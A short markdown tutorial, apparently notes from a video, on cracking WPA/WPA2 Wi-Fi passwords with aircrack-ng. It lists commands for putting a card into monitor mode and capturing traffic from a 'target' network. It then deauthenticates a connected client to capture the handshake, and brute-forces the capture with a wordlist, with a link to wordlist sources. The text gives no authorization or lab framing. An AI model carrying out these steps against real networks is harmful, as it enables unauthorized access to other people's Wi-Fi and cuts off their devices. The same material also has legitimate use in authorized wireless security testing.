# WPA/WPA2 Wifi Password Hack W/ Aircrack-ng

Sources : 
- https://www.youtube.com/watch?v=zAWcu3NQLME&list=PL7WXNOcf6zc0V5rydTqW6Qymm6lnrt33T&index=2

Instructions :

ONLINE PART

1. display network interfaces availables on the machine (common names : wlan0 / wlo1 ...) :
```
iwconfig
```
2. display more details about the interface :
```
ifconfig [interface's name]
```
3. display availables wireless interfaces :
```
airmon-ng
```

`We now want to change the "Managed Mode" into "Monitor Mode" for the purpose of packets capture :`

4. change our wireless card mode :
```
airmon-ng start [interface's name]
```
5. check if the mode change worked, the interface name should now end with "mon" :
```
iwconfig
```
6. grabbing packets on this interface (channel hopping) :
```
airodump-ng [new interface's name]
```

`We have now multiple lines showing availables Wi-Fi in the area, with many informations, we can stop the command when the target appears`

`Keep the terminal open with the informations, we need the BSSID and the channel "CH"`

7. Use Airodump to monitor only the target Wi-Fi network :
```
airodump-ng -c [channel's number] -d [target's BSSID] -w capture [interface's name]
```

`We now need to choose one of the clients of the targeted Wi-Fi (know as stations in the terminal) and knock its connection down so that when he try to reconnect, we intercept the WPA handshake to perfom an offline dictionnary attack`

`(do not stop the previous command since it's displaying a msg when the following commands gets what we want -> capture WPA handshake)`


8. knock one of the clients connection down :
```
aireplay-ng --deauth 0 -a [routers' BSSID] -c [client's BSSID] [monitor interface]
```

`Wait until the WPA handshake or the PMKID appears on the airodump command then stop the two`

`You have now the capture files`

9. make sure you switch your interface back in managed mode : :
```
airmon-ng stop [interface's name]
```

OFFLINE PART

10. Brute force attack on the capture file :
```
aircrack-ng [captureFile.cap] -w [wordlist]
```

Some wordlists availables :
- https://hackntricks.fr/4-wordlists-pour-brute-force-un-mot-de-passe/